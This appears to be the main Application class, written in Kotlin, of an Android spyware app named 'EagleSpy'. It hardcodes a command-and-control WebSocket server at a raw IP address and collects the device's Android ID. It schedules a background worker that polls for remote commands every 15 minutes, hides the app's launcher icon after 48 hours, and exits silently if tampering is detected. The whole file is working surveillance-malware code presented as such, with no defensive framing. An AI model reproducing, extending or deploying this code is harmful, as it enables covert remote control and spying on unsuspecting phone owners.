package com.stealth.eaglespy

import android.app.Application
import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import androidx.work.*
import com.stealth.eaglespy.services.CommandWorker
import com.stealth.eaglespy.security.IntegrityChecker
import java.util.concurrent.TimeUnit

class EagleSpyApp : Application() {

    companion object {
        lateinit var instance: EagleSpyApp
            private set
        
        // C2 Server Configuration
        var serverUrl = "ws://213.91.211.150:3000/cable"
        var deviceId = ""
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        // Security Check: Verify APK integrity
        if (!IntegrityChecker.verify(this)) {
            // Tampered APK detected - exit silently
            android.os.Process.killProcess(android.os.Process.myPid())
            return
        }

        // Generate unique device ID
        deviceId = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )

        // Schedule background command polling
        scheduleCommandWorker()

        // Delayed activation: Hide icon after 48 hours
        scheduleIconHiding()
    }

    private fun scheduleCommandWorker() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val workRequest = PeriodicWorkRequestBuilder<CommandWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "command_worker",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    private fun scheduleIconHiding() {
        val prefs = getSharedPreferences("stealth", MODE_PRIVATE)
        val firstLaunch = prefs.getLong("first_launch", 0L)
        
        if (firstLaunch == 0L) {
            prefs.edit().putLong("first_launch", System.currentTimeMillis()).apply()
        } else {
            val elapsed = System.currentTimeMillis() - firstLaunch
            val delay48h = 48 * 60 * 60 * 1000L // 48 hours

            if (elapsed >= delay48h) {
                hideAppIcon()
            } else {
                Handler(Looper.getMainLooper()).postDelayed({
                    hideAppIcon()
                }, delay48h - elapsed)
            }
        }
    }

    private fun hideAppIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
